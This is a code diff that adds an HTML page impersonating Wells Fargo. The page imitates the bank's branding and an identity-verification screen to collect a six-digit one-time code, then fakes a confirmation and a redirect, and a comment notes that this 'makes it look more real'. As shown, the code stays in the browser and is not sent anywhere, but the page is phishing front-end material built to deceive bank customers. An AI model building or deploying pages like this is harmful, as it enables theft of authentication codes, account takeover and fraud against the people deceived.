@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wells Fargo - Verify Identity</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Wells Fargo Sans', Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+        }
+        .logo {
+            font-weight: bold;
+            font-size: 28px;
+            color: #d71e28; /* Wells Fargo Red */
+            margin-bottom: 30px;
+        }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #d71e28;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        h2 {
+            font-size: 24px;
+            margin: 0 0 10px;
+            color: #333;
+        }
+        p {
+            font-size: 16px;
+            color: #666;
+            margin: 0 0 20px;
+        }
+        /* NEW STYLES FOR CODE INPUT */
+        .code-input {
+            width: 220px;
+            padding: 12px;
+            font-size: 24px;
+            text-align: center;
+            letter-spacing: 8px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            outline: none;
+            transition: border 0.3s;
+        }
+        .code-input:focus {
+            border-color: #d71e28;
+            box-shadow: 0 0 5px rgba(215, 30, 40, 0.3);
+        }
+        /* Success Message (Hidden by default) */
+        #successMessage {
+            display: none;
+            color: #2e7d32;
+            font-weight: bold;
+            font-size: 18px;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">WELLS FARGO</div>
+
+        <!-- LOADING STATE -->
+        <div id="loadingState">
+            <div class="spinner"></div>
+            <h2>Verifying Identity...</h2>
+            
+            <!-- THE FORM CONTAINER -->
+            <form id="verifyForm" onsubmit="submitCode(event)">
+                <input 
+                    type="text" 
+                    id="codeInput" 
+                    class="code-input" 
+                    placeholder="______" 
+                    maxlength="6" 
+                    inputmode="numeric" 
+                    pattern="[0-9]*"
+                    required
+                    autocomplete="off"
+                >
+                <p>Please wait while we confirm your details.</p>
+            </form>
+        </div>
+
+        <!-- SUCCESS STATE (Replaces spinner after submission) -->
+        <div id="loadingStateSuccess" class="hidden">
+            <div class="spinner"></div>
+            <h2>Code Confirmed</h2>
+            <p>Redirecting to your account...</p>
+        </div>
+        
+        <!-- SUCCESS MESSAGE (Final) -->
+        <div id="successMessage">
+            Identity Confirmed!<br>
+            <span style="font-size: 14px; color: #666;">Code: <span id="displayCode"></span></span>
+        </div>
+    </div>
+
+    <script>
+        // Auto-focus the input box on load
+        window.onload = function() {
+            document.getElementById('codeInput').focus();
+        };
+
+        function submitCode(event) {
+            event.preventDefault(); // Stop the page from refreshing immediately
+            
+            var code = document.getElementById('codeInput').value;
+            
+            // 1. Hide the input form
+            document.getElementById('verifyForm').style.display = 'none';
+            
+            // 2. Show a secondary loading state (optional, makes it look more real)
+            var loadingState = document.getElementById('loadingState');
+            loadingState.querySelector('h2').innerText = "Confirming Code...";
+            loadingState.querySelector('p').innerText = "Please wait while we confirm your details.";
+
+            // 3. Simulate a 2-second delay to "process" the code
+            setTimeout(function() {
+                // Hide the first loading state
+                loadingState.style.display = 'none';
+                
+                // Show success message
+                document.getElementById('successMessage').style.display = 'block';
+                document.getElementById('displayCode').innerText = code;
+                
+                // Optional: Log the code to the browser console
+                console.log("User entered code: " + code);
+                
+                // Optional: Redirect to a real URL after a few seconds
+                // window.location.href = "https://www.wellsfargo.com/your-account";
+            }, 2000);
+        }
+
+        // Optional: Auto-advance to submit when 6 digits are typed
+        document.getElementById('codeInput').addEventListener('input', function(e) {
+            if (this.value.length === 6) {
+                // Optional: Submit immediately after typing the 6th digit
+                // submitCode(e); 
+            }
+        });
+    </script>
+
+</body>
+</html>
